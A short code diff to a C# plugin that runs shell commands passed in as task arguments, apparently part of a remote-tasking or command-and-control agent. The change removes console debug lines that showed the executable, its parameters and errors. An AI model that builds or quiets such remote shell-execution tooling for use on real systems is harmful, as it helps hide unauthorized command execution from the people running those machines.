@@ -16,13 +16,10 @@ namespace Plugins
         {
             try
             {
-                Console.WriteLine("Calling shell.");
                 PluginHandler.AddResponse(ShellExec(args));
-                Console.WriteLine("Shell Finished.");
             }
             catch (Exception e)
             {
-                Console.WriteLine(e);
                 //oh no an error
                 PluginHandler.Write(e.ToString(), args["task-id"], true, "error");
             }
@@ -65,8 +62,6 @@ namespace Plugins
             }
 
             string executable = args["executable"];
-            Console.WriteLine($"[{this.Name}] Executable: " + executable);
-            Console.WriteLine($"[{this.Name}] Params: " + parameters);
             Process process = new Process
             {
                 StartInfo = new ProcessStartInfo()
